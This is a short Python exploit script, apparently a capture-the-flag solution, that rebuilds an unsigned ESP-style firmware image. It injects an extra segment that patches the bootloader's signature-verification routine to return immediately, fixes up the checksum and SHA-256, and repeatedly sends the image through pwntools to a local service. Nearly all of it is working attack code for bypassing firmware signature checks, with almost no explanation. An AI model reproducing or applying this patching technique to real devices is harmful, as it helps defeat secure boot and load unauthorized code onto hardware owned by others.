from hashlib import sha256
from Crypto.Util.strxor import strxor

dat = open('./payload-unsigned.bin', 'rb')

out = b''
checksum_byte = 0xEF

# 24 byte header
hdr = dat.read(24)
assert hdr[0] == 0xe9, 'magic incorrect'

segment_count = hdr[1]

hash_appended = hdr[23]

out += b'\xe9' + bytes([segment_count+1]) + hdr[2:-1] + b'\x01'

for i in range(segment_count):
    print(f'parsing segment {i}')
    load_addr = int.from_bytes(dat.read(4), 'little')
    data_len = int.from_bytes(dat.read(4), 'little')
    print(f'\tload_addr = {hex(load_addr)}')
    print(f'\tdata_len = {hex(data_len)}')
    out += load_addr.to_bytes(4, 'little')
    out += data_len.to_bytes(4, 'little')
    segment_data = dat.read(data_len)
    out += segment_data
    for v in segment_data:
        checksum_byte ^= v

# overwrite signature verification with ret
out += (0x4007b7ca).to_bytes(4, 'little')
l = 4
out += (l).to_bytes(4, 'little')
d = strxor(b'\x1d\xf0\x00\x00' , b'\x1e\x6d\x83\x3e'[::-1])
out += d
for v in d:
    checksum_byte ^= v

il = len(out)
print(f'image length: {hex(il)}')
padding = b'\x00' * (15 - il % 16)
out += padding + bytes([checksum_byte])
h = sha256(out).digest()
out += h

exp = out + b'\x00\x00\x00\x00' + b'x' * 64

from pwn import *
from base64 import b64encode

attempts = 0
while True:
    attempts += 1
    print('attempt', attempts)
    conn = remote('0.0.0.0', 1337)
    conn.sendline(b64encode(exp))
    while True:
        a = conn.recvline().strip(b'\r\n').decode()
        print(a)
        if 'epc1=' in a:
            conn.close()
            break
